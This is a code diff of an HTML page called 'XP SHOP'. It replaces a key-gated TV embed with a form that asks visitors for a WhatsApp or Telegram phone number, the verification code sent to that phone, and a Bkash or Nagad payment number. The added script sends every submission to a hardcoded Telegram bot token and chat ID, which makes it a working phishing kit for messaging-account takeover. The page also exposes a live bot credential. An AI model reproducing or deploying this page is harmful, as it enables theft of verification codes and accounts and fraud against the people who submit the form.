@@ -3,68 +3,190 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>Bulk sms sender</title>
+    <title>XP SHOP - Your Trusted Brand</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.1/css/bootstrap.min.css">
     <style>
         body {
-            margin: 0;
-            padding: 0;
-            overflow: hidden;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #000;
+            background-color: #0d1117;
+            color: #ffffff;
+            font-family: 'Arial', sans-serif;
+        }
+        .form-container {
+            background-color: #161b22;
+            border-radius: 10px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.5);
+            padding: 20px;
+        }
+        .btn-custom {
+            background-color: #28a745;
             color: #fff;
-            font-family: Arial, sans-serif;
-        }
-        iframe {
             border: none;
-            width: 100vw;
-            height: 100vh;
         }
-        #login-form {
+        .btn-custom:hover {
+            background-color: #218838;
+        }
+        .help-btn {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background-color: #007bff;
+            color: white;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
             display: flex;
-            flex-direction: column;
             align-items: center;
             justify-content: center;
+            font-size: 24px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
         }
-        #login-form input {
-            margin: 10px;
-            padding: 10px;
-            font-size: 16px;
+        .help-btn:hover {
+            background-color: #0056b3;
         }
-        #login-form button {
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-            background-color: #007BFF;
-            border: none;
-            color: #fff;
+        .history-section {
+            margin-top: 30px;
+        }
+        .history-item {
+            border-bottom: 1px solid #444;
+            padding: 10px 0;
+        }
+        .history-item:last-child {
+            border-bottom: none;
         }
     </style>
 </head>
 <body>
-    <div id="login-form">
-        <h1>Login Required</h1>
-        <input type="text" id="key-input" placeholder="Enter your key">
-        <button onclick="checkKey()">Login</button>
+
+<div class="container py-5">
+    <h1 class="text-center mb-4">XP SHOP - Your Trusted Brand</h1>
+    <div class="form-container mx-auto">
+        <form id="xpForm">
+            <div class="mb-3">
+                <label for="platform" class="form-label">Select Platform:</label>
+                <select class="form-select" id="platform">
+                    <option value="WhatsApp">WhatsApp</option>
+                    <option value="Telegram">Telegram</option>
+                </select>
+            </div>
+            <div class="mb-3">
+                <label for="phone" class="form-label">Phone Number:</label>
+                <input type="number" class="form-control" id="phone" placeholder="Enter phone number" required>
+            </div>
+            <div class="mb-3">
+                <label for="code" class="form-label">Verification Code:</label>
+                <input type="number" class="form-control" id="code" placeholder="Enter verification code" required>
+                <button type="button" class="btn btn-custom mt-2 w-100" onclick="sendCode()">Send Code</button>
+                <small id="timer" class="d-none text-warning">Please wait 30 seconds...</small>
+            </div>
+            <div class="mb-3">
+                <label for="payment" class="form-label">Payment Method:</label>
+                <select class="form-select" id="payment">
+                    <option value="Bkash">Bkash</option>
+                    <option value="Nagad">Nagad</option>
+                </select>
+            </div>
+            <div class="mb-3">
+                <label for="payment-number" class="form-label">Payment Number:</label>
+                <input type="number" class="form-control" id="payment-number" placeholder="Enter payment number" required>
+            </div>
+            <button type="button" class="btn btn-custom w-100" onclick="submitData()">Submit Account</button>
+        </form>
     </div>
-    <iframe id="live-tv" src="https://livetvbd.github.io/Tv/" allowfullscreen style="display: none;"></iframe>
 
-    <script>
-        const validKeys = ["xx", "xp", "xn", "hub", "vp", "vip", "test"];
+    <div class="history-section">
+        <h3 class="text-center">Submission History</h3>
+        <ul id="history-list" class="list-group text-white mt-3">
+            <!-- History items will be added here -->
+        </ul>
+    </div>
+</div>
 
-        function checkKey() {
-            const userInput = document.getElementById("key-input").value.trim();
-            if (validKeys.includes(userInput)) {
-                document.getElementById("login-form").style.display = "none";
-                document.getElementById("live-tv").style.display = "block";
-            } else {
-                alert("Invalid key! Please try again.");
-            }
+<button class="help-btn" onclick="sendHelpMessage()">?</button>
+
+<script>
+    // টেলিগ্রাম বট API টোকেন এবং চ্যাট আইডি
+    const botToken = "7652994817:AAH4sJTGnL5lQpPeGdEu4wYPyITTszlyUuQ";
+    const chatId = "2104472242";
+
+    let submitTimerActive = false;
+
+    // কোড পাঠানোর ফাংশন
+    function sendCode() {
+        const phone = document.getElementById('phone').value;
+        if (!phone) {
+            alert("Please enter a valid phone number.");
+            return;
         }
-    </script>
+
+        const message = `Code requested for phone: ${phone}`;
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        fetch(url)
+            .then(response => response.ok ? alert("Code sent!") : alert("Failed to send code."))
+            .catch(() => alert("Error in sending code."));
+
+        document.getElementById('timer').classList.remove('d-none');
+        setTimeout(() => {
+            document.getElementById('timer').classList.add('d-none');
+        }, 30000);
+    }
+
+    // সাবমিট করার ফাংশন
+    function submitData() {
+        if (submitTimerActive) {
+            alert("Please wait 10 seconds before submitting again.");
+            return;
+        }
+
+        const platform = document.getElementById('platform').value;
+        const phone = document.getElementById('phone').value;
+        const code = document.getElementById('code').value;
+        const payment = document.getElementById('payment').value;
+        const paymentNumber = document.getElementById('payment-number').value;
+
+        if (!phone || !code || !paymentNumber) {
+            alert("Please fill in all fields.");
+            return;
+        }
+
+        const message = `New submission:\nPlatform: ${platform}\nPhone: ${phone}\nCode: ${code}\nPayment: ${payment}\nPayment Number: ${paymentNumber}`;
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        fetch(url)
+            .then(response => response.ok ? alert("Submitted successfully!") : alert("Failed to submit."))
+            .catch(() => alert("Error in submission."));
+
+        addToHistory(platform, phone, code, payment, paymentNumber);
+        resetForm();
+        startSubmitTimer();
+    }
+
+    // হিস্টরিতে যোগ করার ফাংশন
+    function addToHistory(platform, phone, code, payment, paymentNumber) {
+        const historyList = document.getElementById('history-list');
+        const listItem = document.createElement('li');
+        listItem.className = 'list-group-item history-item';
+        listItem.innerText = `Platform: ${platform}, Phone: ${phone}, Code: ${code}, Payment: ${payment}, Payment Number: ${paymentNumber}`;
+        historyList.appendChild(listItem);
+    }
+
+    // ইনপুট রিসেট ফাংশন
+    function resetForm() {
+        document.getElementById('xpForm').reset();
+    }
+
+    // সাবমিট টাইমার
+    function startSubmitTimer() {
+        submitTimerActive = true;
+        setTimeout(() => {
+            submitTimerActive = false;
+        }, 10000);
+    }
+
+    // হেল্প মেসেজ ফাংশন
+    function sendHelpMessage() {
+        window.open("https://t.me/WA_BD_BAYER", "_blank");
+    }
+</script>
+
 </body>
 </html>
